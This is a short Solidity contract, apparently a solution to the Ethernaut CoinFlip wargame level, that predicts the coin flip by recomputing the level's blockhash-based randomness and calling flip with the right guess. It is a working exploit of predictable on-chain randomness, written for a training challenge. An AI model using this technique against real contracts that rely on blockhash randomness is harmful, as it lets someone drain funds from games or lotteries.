// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CoinFlip} from "ethernaut/levels/CoinFlip.sol";

contract Attacker {
    CoinFlip target;
    // NOTE: Factor is equal to 0x8000000000000000000000000000000000000000000000000000000000000000
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function psychicFlip() public returns (bool) {
        // copy paste the same code as the target contract
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        return target.flip(guess);
    }
}
